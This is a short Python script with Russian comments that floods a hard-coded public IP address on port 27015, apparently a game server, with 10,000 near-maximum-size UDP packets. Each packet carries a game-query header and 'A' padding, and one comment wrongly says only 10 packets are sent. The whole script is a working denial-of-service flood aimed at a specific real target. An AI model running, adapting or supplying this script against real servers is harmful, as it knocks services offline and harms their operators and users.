import socket

# Настройки сервера
server_ip = "151.106.5.230"
server_port = 27015

# Генерация данных для отправки (пакет размером ~65 KB)
chunk_size = 65507  # Максимально допустимый размер UDP
data = b"\xff\xff\xff\xff" + b"A" * (chunk_size - 4)  # Учитываем заголовок

# Создаем сокет
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

try:
    # Отправляем данные несколько раз
    for i in range(10000):  # Отправляем 10 пакетов (можно увеличить)
        sock.sendto(data, (server_ip, server_port))
        print(f"Пакет {i+1} отправлен на сервер {server_ip}:{server_port}.")
finally:
    sock.close()
    print("Отправка завершена.")
